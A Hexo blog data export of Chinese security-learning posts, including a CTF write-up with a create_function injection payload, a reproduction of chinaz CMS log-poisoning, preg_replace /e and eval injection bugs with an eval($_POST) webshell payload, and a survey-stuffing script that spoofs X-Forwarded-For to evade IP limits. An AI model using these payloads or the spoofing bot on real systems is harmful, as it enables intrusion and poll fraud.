{"meta":{"title":"glotozz'blog","subtitle":"这个人比较菜，什么话也留不下","description":null,"author":"glotozz","url":"http://yoursite.com","root":"/"},"pages":[{"title":"感谢","date":"2019-07-18T11:37:42.000Z","updated":"2019-07-18T11:38:41.901Z","comments":true,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":"谢谢支持我的小伙伴"}],"posts":[{"title":"未完成的seacms","slug":"未完成的seacms","date":"2019-08-14T04:02:41.000Z","updated":"2019-08-14T04:36:23.431Z","comments":true,"path":"2019/08/14/未完成的seacms/","link":"","permalink":"http://yoursite.com/2019/08/14/未完成的seacms/","excerpt":"昨天复现了chinaz中的3个命令执行漏洞，其中第3个虽然复现成功了，但是对payload还是不太懂，原理与海洋CMS类似，这里就来复现下海洋CMS","text":"function doDecrypt (pwd, onError) { console.log('in doDecrypt'); const txt = document.getElementById('enc_content').innerHTML; let plantext; try { const bytes = CryptoJS.AES.decrypt(txt, pwd); var plaintext = bytes.toString(CryptoJS.enc.Utf8); } catch(err) { if(onError) { onError(err); } return; } document.getElementById('enc_content').innerHTML = plaintext; document.getElementById('enc_content').style.display = 'block'; document.getElementById('enc_passwd').style.display = 'none'; if(typeof MathJax !== 'undefined') { MathJax.Hub.Queue( ['resetEquationNumbers', MathJax.InputJax.TeX], ['PreProcess', MathJax.Hub], ['Reprocess', MathJax.Hub] ); } } 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 var onError = function(error) { document.getElementById(\"enc_error\").innerHTML = \"password error!\" }; function decrypt() { var passwd = document.getElementById(\"enc_pwd_input\").value; console.log(passwd); doDecrypt(passwd, onError); }","categories":[],"tags":[{"name":"cms","slug":"cms","permalink":"http://yoursite.com/tags/cms/"}]},{"title":"codebreaking-2","slug":"codebreaking-2","date":"2019-08-14T04:01:05.000Z","updated":"2019-08-14T04:02:00.122Z","comments":true,"path":"2019/08/14/codebreaking-2/","link":"","permalink":"http://yoursite.com/2019/08/14/codebreaking-2/","excerpt":"","text":"","categories":[],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://yoursite.com/tags/代码审计/"},{"name":"codebreaking","slug":"codebreaking","permalink":"http://yoursite.com/tags/codebreaking/"}]},{"title":"codebreaking-1","slug":"codebreaking-1","date":"2019-08-14T02:20:02.000Z","updated":"2019-08-14T04:19:09.122Z","comments":true,"path":"2019/08/14/codebreaking-1/","link":"","permalink":"http://yoursite.com/2019/08/14/codebreaking-1/","excerpt":"chrome+phpstorm的调试问题真是醉了，想起之前看到同学在刷code breaking，正好可以看看那个😀","text":"chrome+phpstorm的调试问题真是醉了，想起之前看到同学在刷code breaking，正好可以看看那个😀 easy - function12345678&lt;?php $action = $_GET[&apos;action&apos;] ?? &apos;&apos;; $arg = $_GET[&apos;arg&apos;] ?? &apos;&apos;; if(preg_match(&apos;/^[a-z0-9_]*$/isD&apos;, $action)) &#123; show_source(__FILE__); &#125; else &#123; $action(&apos;&apos;, $arg);&#125; $a ?? 0 等同于 isset($a) ? $a : 0 preg_match()返回 pattern 的匹配次数。 它的值将是0次（不匹配）或1次，因为preg_match()在第一次匹配后 将会停止搜索。要想办法绕过正则， ^ 匹配字符串开头，在多行模式中匹配每一行的开头$ 匹配字符串末尾，在多行模式中匹配每一行的末尾 模式分隔符后的”i”标记这是一个大小写不敏感的搜索 模式分隔符后的”s”标记模式中的点号元字符匹配所有字符, 包含换行符 模式分隔符后的”D”标记模式中的元字符美元符号仅仅匹配目标字符串的末尾. 正则很明显，就是要想办法在函数名的头或者尾找一个字符，不影响函数调用。 怎么找呢，fuzz大法好 当然fuzz也有技巧，有时候可以先自己写个脚本fuzz.php 这里不需要修改脚本，只需要在传值的时候在fuzz后加上一个正常的函数名，我用了var_dump，第一次用了echo会报错 (○´･д･)ﾉ 发现#是400错误，\\正常显示，原理可以参考给出的链接 然后是控制第二个参数来执行命令，可以使用create_function()来完成 函数结构 1234567create_function(&apos;$a,$b&apos;,&apos;return 111&apos;)==&gt; function a($a,$b)&#123; return 111;&#125; 我们想要执行任意代码，首先需要跳出函数定义 1234567create_function(&apos;$a,$b&apos;,&apos;return 111;&#125;phpinfo();//&apos;)==&gt;function a($a, $b)&#123; return 111;&#125;phpinfo();//&#125; 很奇怪的是直接执行下面的会报错，而且不能把//去掉 123function a($a, $b)&#123; return 111;&#125;phpinfo();//&#125; 所以最后的payload： ?action=\\create_function&amp;arg=}phpinfo();// 参考链接：https://paper.seebug.org/755/ phpstorm的调试问题真是醉了，想起之前看到同学在刷","categories":[],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://yoursite.com/tags/代码审计/"},{"name":"codebreaking","slug":"codebreaking","permalink":"http://yoursite.com/tags/codebreaking/"}]},{"title":"chinaz的代码执行和命令执行漏洞","slug":"chinaz的代码执行和命令执行漏洞","date":"2019-08-13T04:57:44.000Z","updated":"2019-08-13T05:52:43.257Z","comments":true,"path":"2019/08/13/chinaz的代码执行和命令执行漏洞/","link":"","permalink":"http://yoursite.com/2019/08/13/chinaz的代码执行和命令执行漏洞/","excerpt":"Xman回来的第2天，把刘哥发的北京营的ppt看了下，复现了chinaz的三个命令执行漏洞，以前都是盲目刷题，题目质量层次不齐，对很多原理也是一知半解，在Xman的时候和张力大佬聊了许多，以后要多复现CMS。","text":"Xman回来的第2天，把刘哥发的北京营的ppt看了下，复现了chinaz的三个命令执行漏洞，以前都是盲目刷题，题目质量层次不齐，对很多原理也是一知半解，在Xman的时候和张力大佬聊了许多，以后要多复现CMS。 1、index.php1234567891011121314&lt;?php require_once(&quot;library/common.php&quot;); require_once(&quot;library/view.php&quot;); $view_class = new View(); $data = array(); if (isset($_GET[&apos;page&apos;])) &#123; $data[&apos;page&apos;] = filter($_GET[&apos;page&apos;]); &#125; else&#123; $data[&apos;page&apos;] = &apos;js&apos;; &#125; $view_class-&gt;echoContent($data[&apos;page&apos;], $data);?&gt; index页面通过page参数调用不同功能的php页面 2、action.php12345678910&lt;?php require_once(&quot;library/common.php&quot;); require_once(&quot;library/view.php&quot;); $page = filter($_POST[&apos;page&apos;]).&apos;.php&apos;; $post_data = array(); foreach ($_POST as $key =&gt; $value) &#123; $post_data[$key] = $value; &#125; @require_once($page);?&gt; 存在文件包含，但是存在后缀.php，过滤主要是filter， 全局搜索 12345&gt; function filter($input)&gt; &#123;&gt; return str_replace(&apos;.&apos;, &apos;&apos;, $input);&gt; &#125;&gt; 将 . 过滤成空，文件包含路径中不能有 . 导致无法使用相对路径 那么我们可以使用绝对路径进行包含。 可以包含常见重要文件或日志文件 3、common.php12345function write_log($input)&#123; global $cfg_logfile; file_put_contents($cfg_logfile, $input, FILE_APPEND);&#125; 123456789101112function loadFile($filePath)&#123; global $cfg_basedir; if(!file_exists($filePath))&#123; write_log(&apos;Try to open Null file:&apos;.$filePath); return file_get_contents($cfg_basedir.&apos;/error.php&apos;); &#125; $fp = @fopen($filePath,&apos;r&apos;); $sourceString = @fread($fp,filesize($filePath)); @fclose($fp); return $sourceString;&#125; 1$cfg_logfile = dirname($_SERVER[&apos;SCRIPT_FILENAME&apos;]) . DS. &quot;logs/logfile.php&quot;; 当访问不存在的页面时，写入内容到logs/logfile.php中 4、漏洞一攻击复现构造payload： http://59.110.164.44:8238/?page=%3Cphp%20phpinfo();?%3E 访问： http://59.110.164.44:8238/logs/logfile.php 如果没有直接访问权限，也可以使用action.php中的文件包含， 并且可以看到phpinfo中，因此无法远程文件包含 allow_url_fopen On On allow_url_include Off Off 5、normaliz.php12345678910try&#123; if ($method == &apos;/\\\\d+\\\\.\\\\d+\\\\.\\\\d+\\\\.\\\\d+/&apos;) &#123; $res = preg_replace($method, $ip_replacement, $source); &#125; else &#123; $res = preg_replace($method, $mail_replacement, $source); &#125; &#125; preg_replace的正则如果加了e这个选项，会把正则表达式替换的部分替换之后的内容执行一下，然后将执行完的结果放入需要被替换的位置 method=/a/e&amp;mail_replacement=phpinfo()&amp;source=a; preg_replace(“/a/e”,”phpinfo()”,”a”); 但是php 7.0.0开始，不再支持/e修饰符，请用preg_replace_callback()代替 而且从前面的phpinfo得知我们的PHP版本是7.3.4🤦‍ 6、先解决变量覆盖问题1234567$view_class = new View();$data = array();$data[&apos;page&apos;] = &apos;normaliz&apos;;$ip_replacement = &apos;222.222.222.222&apos;;$mail_replacement = &apos;lollol@lol.com&apos;;$data[&apos;res&apos;] = action($post_data, $ip_replacement, $mail_replacement);$view_class-&gt;echoContent($data[&apos;page&apos;], $data); 除了$post_data，其他值都是写死的，如何控制 通过action.php的文件包含，进行变量覆盖控制 1234$post_data = array();foreach ($_POST as $key =&gt; $value) &#123; $post_data[$key] = $value;&#125; + normaliz.php 1234function action($post_data, $ip_replacement, $mail_replacement)&#123; foreach ($post_data as $key =&gt; $value) &#123; $$key = $value; &#125; 7、漏洞二攻击复现在本地将php切换为php5.4构造payload: http://127.0.0.1/chinaz/ post： page=normaliz&amp;method=/a/e&amp;mail_replacement=phpinfo()&amp;source=a 8、view.php1@eval(&quot;if(&quot;.$strIf.&quot;)&#123;\\$ifstatus=true;&#125;else&#123;\\$ifstatus=false;&#125;&quot;); 和典型的海洋cms漏洞差不多 1234&lt;?php $strIf=&apos;&quot;&quot;or phpinfo() or&quot;&quot;==&quot;&quot;&apos;; var_dump(&quot;if(&quot;.$strIf.&quot;)&#123;\\$ifstatus=true;&#125;else&#123;\\$ifstatus=false;&#125;&quot;); var_dump(@eval(&quot;if(&quot;.$strIf.&quot;)&#123;\\$ifstatus=true;&#125;else&#123;\\$ifstatus=false;&#125;&quot;)); 结果： 1234567string(66) &quot;if(&quot;&quot;or phpinfo() or&quot;&quot;==&quot;&quot;)&#123;$ifstatus=true;&#125;else&#123;$ifstatus=false;&#125;&quot;phpinfo()PHP Version =&gt; 7.3.4System =&gt; Windows NT DESKTOP-58QQPVV 10.0 build 17134 (Windows 10) AMD64............ 9、寻找攻击点123456789101112131415161718192021&lt;?php require_once(&quot;library/common.php&quot;); require_once(&quot;library/view.php&quot;); function action($post_data)&#123; foreach ($post_data as $key =&gt; $value) &#123; $$key = $value; &#125; if ($method===&apos;md5&apos;)&#123; $res = md5($source); &#125; if ($method===&apos;sha1&apos;)&#123; $res = sha1($source); &#125; return $res; &#125; $view_class = new View(); $data = array(); $data[&apos;page&apos;] = &apos;md5&apos;; $data[&apos;res&apos;] = action($post_data); $view_class-&gt;echoContent($data[&apos;page&apos;], $data);?&gt; md5文件包含了view.php，且有变量覆盖点，res可控制$strif 话是这么说，但是看了半天也看不懂res是怎么控制$strIf的，太多处理函数，最讨厌的一点是我每次firefox+burp+phpstorm调试一会就会断掉。。。不知道为啥😭 10、漏洞三复现构造payload： http://127.0.0.1/chinaz/action.php post：page=md5&amp;res=”or @eval($_POST[adddd]) or “&amp;adddd=phpinfo(); 这里的post的值需要bp抓包修改，因为hackbar直接传值res会变成”” 跟着pdf里面的流程走了一遍，除了第三个具体细节不是很懂，等下次复现海洋CMS的时候再回头看看把，还有希望有人帮我解决我的调试问题。","categories":[],"tags":[{"name":"cms","slug":"cms","permalink":"http://yoursite.com/tags/cms/"},{"name":"命令执行与代码执行","slug":"命令执行与代码执行","permalink":"http://yoursite.com/tags/命令执行与代码执行/"}]},{"title":"爬虫入门","slug":"爬虫入门","date":"2019-07-25T05:20:39.000Z","updated":"2019-08-13T05:48:03.453Z","comments":true,"path":"2019/07/25/爬虫入门/","link":"","permalink":"http://yoursite.com/2019/07/25/爬虫入门/","excerpt":"在软件创新实验室暑期集训的时候，叶同学讲了爬虫，这里简单把两种爬虫应用记录下。还有，我第一次接触爬虫是通过张宏伦的《全栈数据工程师》，感兴趣的可以去看看","text":"在软件创新实验室暑期集训的时候，叶同学讲了爬虫，这里简单把两种爬虫应用记录下。还有，我第一次接触爬虫是通过张宏伦的《全栈数据工程师》，感兴趣的可以去看看 1、爬取某网站的招聘信息1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677import requestsimport reimport timeimport jsonimport csvfrom bs4 import BeautifulSoupheaders = &#123; &apos;User-Agent&apos;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36&quot;&#125;s = requests.session()f = open(&quot;data.json&quot;, &quot;a&quot;, encoding=&apos;utf-8&apos;)def get_one_page(url): try: r = requests.get(url, headers=headers) r.encoding = r.apparent_encoding return r.text except: return &quot;爬取失败&quot;import pandas as pddef parse_page3(res): html = BeautifulSoup(res, &quot;html.parser&quot;) # print(res) result = [] place = html.select(&quot;#list_con &gt; li &gt; div.item_con.job_title &gt; div.job_name.clearfix &gt; a &gt; span.address&quot;) job = html.select(&apos;#list_con &gt; li &gt; div.item_con.job_title &gt; div.job_name.clearfix &gt; a &gt; span.name&apos;) salary = html.select(&apos;#list_con &gt; li &gt; div.item_con.job_title &gt; p&apos;) company = html.select(&apos;#list_con &gt; li &gt; div.item_con.job_comp &gt; div &gt; a&apos;) welfare = html.select(&apos;#list_con &gt; li &gt; div.item_con.job_title &gt; div.job_wel.clearfix&apos;) for place, job, salary, company, welfare in zip(place, job, salary, company, welfare): result.append(&#123; &quot;place&quot;: place.get_text(), &quot;job&quot;: job.get_text(), &quot;salary&quot;: salary.get_text(), &quot;company&quot;: company.get_text(), &quot;welfare&quot;: welfare.get_text() &#125;) # 储存为json文件 f.write(json.dumps(result, indent=2, ensure_ascii=False)) # 储存为csv文件(pandas) df = pd.DataFrame(result) df.to_csv(&apos;data2.csv&apos;, index=False, sep=&apos;,&apos;, mode=&apos;a&apos;) # 储存为excel文件 df = pd.DataFrame(result) df.to_csv(&apos;data3.xls&apos;, index=False, sep=&apos; &apos;, mode=&apos;a&apos;, encoding=&apos;utf-8_sig&apos;) return resultdef main(offset): url = &quot;https://hz.58.com/ywtzjingli/pn&quot; + str( offset) + &quot;/?classpolicy=main_null,job_A&amp;final=1&amp;jump=1&amp;PGTID=0d35f8c7-0004-f4fa-d607-70e9d941aa91&amp;ClickID=2&quot; html = get_one_page(url) result = parse_page3(html) # print(result) # tmp1 = [] # for dic in result: # print(dic) # tmp = [] # tmp.append(dic[&apos;place&apos;]) # tmp.append(dic[&apos;job&apos;]) # tmp.append(dic[&apos;salary&apos;]) # tmp.append(dic[&apos;company&apos;]) # tmp.append(dic[&apos;welfare&apos;]) # print(tmp) # tmp1.append(tmp)if __name__ == &apos;__main__&apos;: for i in range(1, 4): main(i) time.sleep(1) 2、自动填写问卷123456789101112131415161718192021222324252627282930313233import timefrom random import randintimport requestsurl = &quot;https://www.wjx.cn/joinnew/processjq.ashx?submittype=1&amp;curID=43819938&amp;t=1565166732242&amp;starttime=2019%2F8%2F7%2016%3A32%3A09&amp;ktimes=26&amp;rn=606189091.36417905&amp;hlv=1&amp;jqnonce=b636e088-5337-4ff5-973b-4ac2fd8b59ee&amp;jqsign=d050c6%3E%3E%2B3551%2B2%60%603%2B%3F15d%2B2ge4%60b%3Ed3%3Fcc&amp;jpm=17&quot;for i in range(1,10): header = &#123; &apos;Host&apos;:&apos;www.wjx.cn&apos;, &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0&apos;, &apos;Accept&apos;: &apos;* / *&apos;, &apos;Accept - Language&apos;:&apos;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&apos;, &apos;Accept - Encoding&apos;: &apos;gzip, deflate&apos;, &apos;Content-Type&apos;: &apos;application/x-www-form-urlencoded&apos;, &apos;Referer&apos;: &apos;https://www.wjx.cn/jq/43819938.aspx&apos;, &apos;Content-Length&apos;: &apos;32&apos;, &apos;x-forwarded-for&apos;:str(randint(1,255))+&apos;,&apos;+str(randint(1,255))+&apos;,&apos;+str(randint(1,255))+&apos;,&apos;+str(randint(1,255)), &apos;Cookie&apos;: &apos;acw_tc=2f624a2a15651667032113449e5a5a78c559be33a29f05393240f389ae1f26; .ASPXANONYMOUS=xwlWYYyD1QEkAAAANGQyY2UwY2QtNmMwMi00YzdjLTkyNjgtYjAwOTJjYzJlZWJhKVHVbWcXUrju0Qwec7aNRZwVtj81; jac43819938=36417905; UM_distinctid=16c6b348da41e1-011e2866b35c748-4c312272-144000-16c6b348da529f; CNZZDATA4478442=cnzz_eid%3D1762370884-1565166375-%26ntime%3D1565166375; Hm_lvt_21be24c80829bd7a683b2c536fcf520b=1565166702; Hm_lpvt_21be24c80829bd7a683b2c536fcf520b=1565166729; jpckey=%u5B66%u5386; LastActivityJoin=43819938,103045812444&apos;, &apos;Connection&apos;: &apos;close&apos; &#125; print(&apos;Using ip:&apos;+header[&apos;x-forwarded-for&apos;]) #submitdata = &quot;1$%s&#125;2$%s&#125;3$%s&quot; % (str(randint(1, 2)), str(randint(1, 4)), str(randint(1, 4))) # data = &#123; # &apos;submitdata&apos;:submitdata # &#125; data = &quot;submitdata=1%24&quot;+str(randint(1,2))+&quot;%7D2%24&quot;+str(randint(1,4))+&quot;%7D3%24&quot;+str(randint(1,4)) print data r = requests.post(url,headers=header,data=data) print r.headers print r.content time.sleep(40) headers从bp抓的包复制即可 绕过方法：使用xff、设置脚本发包的时间间隔 目前脚本很大概率会出现国外ip，可以搜集国内ip 参考链接：https://mochazz.github.io/","categories":[],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://yoursite.com/tags/爬虫/"}]},{"title":"Start","slug":"start","date":"2019-07-18T03:48:34.000Z","updated":"2019-07-18T11:16:12.822Z","comments":true,"path":"2019/07/18/start/","link":"","permalink":"http://yoursite.com/2019/07/18/start/","excerpt":"","text":"Skr 这次天buuctf做到自闭，看换个博客能不能换个心情:)","categories":[],"tags":[{"name":"start","slug":"start","permalink":"http://yoursite.com/tags/start/"}]}]}